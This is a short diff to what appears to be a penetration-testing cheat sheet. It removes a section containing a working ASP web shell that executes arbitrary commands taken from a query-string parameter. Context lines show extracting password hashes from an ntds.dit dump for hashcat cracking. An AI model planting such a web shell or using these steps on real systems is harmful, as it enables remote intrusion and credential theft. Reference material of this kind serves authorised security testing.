@@ -113,24 +113,6 @@ Then, extract all the hashes to put them on hashcat.
 cat ntds.dit | cut -d : -f 4 |sort|uniq > hashes.txt
 ```
 
-## Pentest Web
-
-### Webshell
-
-ASP : 
-```markdown
-<%
-Response.write("<pre>")
-Set rs = CreateObject("WScript.Shell")
-Set cmd = rs.Exec("cmd /c " & Request.QueryString("cmd"))
-o = cmd.StdOut.Readall()
-Response.write(o)
-Response.write("</pre>")
-%>
-```
-
-
-
 ## Bruteforce
 
 ### SSH
